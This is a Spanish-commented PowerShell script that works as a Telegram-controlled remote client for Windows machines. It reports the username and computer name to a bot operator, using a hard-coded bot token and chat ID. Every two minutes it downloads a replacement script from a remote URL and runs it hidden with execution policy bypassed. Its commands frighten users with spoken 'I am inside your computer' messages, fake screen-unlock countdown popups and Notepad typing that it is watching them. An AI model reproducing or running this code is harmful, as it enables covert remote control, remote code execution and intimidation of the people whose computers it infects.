# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM (Pon tus datos aquí)
# ==============================================================================
$Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg" # REEMPLAZA CON TU TOKEN REAL COMPLETO
$ChatID = "1018796719"                                    # REEMPLAZA CON TU CHAT ID REAL COMPLETO

# para la auto-actualización (Misma que usa el cargador)
$UrlGitHub  = "https://githubusercontent.com" 
$RutaLocal  = "$PSScriptRoot\cliente_base.ps1"

# Construcción de URL fija ultra-estable que acabamos de validar
$URL    = "https://api.telegram.org/bot" + $Token
$MiPC   = $env:COMPUTERNAME
$User   = $env:USERNAME
# ==============================================================================
# NO BORRAR #############################################################
# ==============================================================================
# ==============================================================================
# BUCLE PRINCIPAL CON SISTEMA DE IDS NUMÉRICOS CORREGIDO
# ==============================================================================
while ($true) {
    try {
        # 🔄 SISTEMA DE AUTO-ACTUALIZACIÓN CADA 2 MINUTOS (Para pruebas rápidas)
        if ($Cronometro.Elapsed.TotalMinutes -ge 2) {
            try {
                Invoke-WebRequest -Uri $UrlGitHub -OutFile $RutaLocal -TimeoutSec 10 -ErrorAction Stop
                if (Test-Path $RutaLocal) {
                    Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$RutaLocal`""
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "🔄 Script ID [$MiPC] actualizado automáticamente a la última versión de GitHub." })
                    Exit
                }
            } catch {
                $Cronometro.Restart()
            }
        }

        # Conexión con Telegram (Espera mensajes hasta por 15 segundos)
        $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
        
        foreach ($Update in $Updates.result) {
            $LastUpdateID = $Update.update_id + 1
            $TextoRecibido = $Update.message.text
            $RemitenteChatID = $Update.message.chat.id

            if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                
                $Partes = $TextoRecibido -split " "
                $Comando = [string]$Partes[0]
                $Comando = $Comando.ToLower()
                
                $IDDestino = ""
                if ($Partes.Count -gt 1) {
                    $IDDestino = [string]$Partes[1]
                }

                # CALCULAR ID DE 3 DÍGITOS ESTABLECE (Válido para todo el bucle)
                $Md5 = [System.Security.Cryptography.MD5]::Create()
                $HashBytes = $Md5.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($MiPC))
                $IdUnico = ([BitConverter]::ToUInt16($HashBytes, 0) % 900) + 100
                $MiIDNum = [string]$IdUnico

                # --- COMANDO GLOBAL: /lista ---
                if ($Comando -eq "/lista") {
                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                    continue
                }

                # --- COMANDO GLOBAL DE AYUDA: /ayuda ---
                if ($Comando -eq "/ayuda") {
                    $TextoAyuda = "MANUAL DE CONTROL NUMERICO`n`n" +
                                  "Comandos Globales:`n" +
                                  " /lista - Ver que numero de ID tomo cada PC.`n" +
                                  " /ayuda - Ver este menu.`n`n" +
                                  "Comandos Individuales:`n" +
                                  " /cuenta [Numero]`n" +
                                  " /dentro [Numero]`n" +
                                  " /notepad [Numero]`n`n" +
                                  "Ejemplo de uso: /notepad " + $MiIDNum
                    
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                    continue
                }

                # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el de esta máquina
                if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                    
                    switch ($Comando) {
                        
                        "/dentro" {
                            Add-Type -AssemblyName System.Speech
                            $synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer
                            $synthesizer.Speak("Hola. Estoy dentro de tu computadora.")
                        }                       
                        
                        "/cuenta" {
                            $wsh = New-Object -ComObject WScript.Shell
                            for ($i = 60; $i -gt 0; $i--) {
                                $wsh.Popup("Faltan $i segundos para desbloquear la pantalla.", 1, "Cuenta Regresiva", 0 + 48 + 4096)
                            }
                        }
                           
                        "/notepad" {
                            Start-Process "notepad.exe"
                            Start-Sleep -Milliseconds 500
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("Te estoy observando por Internet... 👀")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                        }
                    }
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 3
    }
    Start-Sleep -Seconds 2
}



